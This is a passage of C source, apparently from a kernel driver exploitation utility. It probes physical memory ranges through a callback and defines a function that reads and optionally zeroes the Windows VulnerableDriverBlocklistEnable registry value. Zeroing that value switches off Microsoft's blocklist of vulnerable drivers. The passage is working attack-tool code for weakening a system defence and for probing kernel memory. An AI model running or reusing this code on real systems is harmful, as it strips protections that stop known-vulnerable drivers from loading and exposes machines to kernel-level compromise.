                switch (pPartialDesc->Flags & CM_RESOURCE_MEMORY_LARGE)
                {
                case CM_RESOURCE_MEMORY_LARGE_40:
                    length <<= 8;
                    break;
                case CM_RESOURCE_MEMORY_LARGE_48:
                    length <<= 16;
                    break;
                case CM_RESOURCE_MEMORY_LARGE_64:
                    length <<= 32;
                    break;
                }

                ULONG_PTR endAddress, queryAddress;
                ULONG x = 0;

                queryAddress = pPartialDesc->u.Memory.Start.QuadPart;
                endAddress = queryAddress + length;

                supPrintfEvent(kduEventInformation, 
                    "[+] Enumerating memory range 0x%llX -> 0x%llX\r\n", queryAddress, endAddress);

                do {

                    if (x == 0) {
                        printf_s("\r\tProbing memory at 0x%llX with size 0x%llX", queryAddress, PAGE_SIZE * 16);
                        x = 16;
                    }

                    if (Callback(queryAddress, UserContext)) {
                        break;
                    }

                    queryAddress += PAGE_SIZE;
                    --x;

                } while (queryAddress < endAddress);

                printf_s("\33[2K\r\tRange probed successfully\r\n");
            }
        }
    }

    return TRUE;
}

/*
* supDetectMsftBlockList
*
* Purpose:
*
* Return state of CI variable enabling/disabling msft block list.
*
*/
BOOL supDetectMsftBlockList(
    _In_ PBOOL Enabled,
    _In_ BOOL Disable
)
{
    LPCWSTR lpKey = L"System\\CurrentControlSet\\Control\\CI\\Config";
    LPCWSTR lpValue = L"VulnerableDriverBlocklistEnable";

    HKEY hKey;
    DWORD dwType = REG_DWORD, cbData = sizeof(DWORD), dwEnabled = 0;

    LRESULT result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, lpKey, 0, KEY_ALL_ACCESS, &hKey);
    if (result == ERROR_SUCCESS) {

        result = RegQueryValueExW(hKey, lpValue, 0, &dwType, (LPBYTE)&dwEnabled, &cbData);

        if (result == ERROR_SUCCESS && dwType == REG_DWORD) {
            *Enabled = (dwEnabled > 0);
        }

        if (Disable) {
            cbData = sizeof(DWORD);
            dwEnabled = 0;
            result = RegSetValueEx(hKey, lpValue, 0, REG_DWORD, (LPBYTE)&dwEnabled, cbData);
        }

        RegCloseKey(hKey);
    }

    return (result == ERROR_SUCCESS);
}
